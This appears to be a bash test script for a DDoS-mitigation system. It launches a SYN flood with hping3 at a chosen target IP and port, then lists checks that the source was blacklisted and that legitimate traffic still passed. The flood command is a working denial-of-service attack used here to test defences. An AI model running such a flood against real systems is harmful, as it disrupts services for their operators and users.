#!/bin/bash
# PHASE 5 Test: SYN Flood Attack (single IP)
# Expected: IP gets temp blacklisted after score reaches 40

TARGET_IP=$1
TARGET_PORT=${2:-7080}
DURATION=${3:-60}

if [ -z "$TARGET_IP" ]; then
    echo "Usage: $0 <target_eip> [port] [duration_seconds]"
    exit 1
fi

echo "[SYN FLOOD TEST] Launching SYN flood attack"
echo "Target: $TARGET_IP:$TARGET_PORT"
echo "Duration: ${DURATION}s"
echo "Expected: Source IP gets temp blacklisted (attack score >= 40)"
echo ""

# SYN flood: 1000 packets/sec for duration
hping3 --flood -S -p $TARGET_PORT $TARGET_IP -c $(($DURATION * 1000)) &
FLOOD_PID=$!

echo "Attack PID: $FLOOD_PID"
echo "Flooding for ${DURATION}s..."
sleep $DURATION

# Kill flood
kill -9 $FLOOD_PID 2>/dev/null

echo ""
echo "[SYN FLOOD TEST] Attack complete"
echo "Verification steps:"
echo "  1. Check temp_blacklist table for this attacker IP"
echo "  2. Check ip_attack_signatures for score >= 40, type='syn_flood'"
echo "  3. Verify XDP DROP_TEMP_BLACKLIST counter increased"
echo "  4. Confirm legitimate webclient traffic still passes (no false positives)"
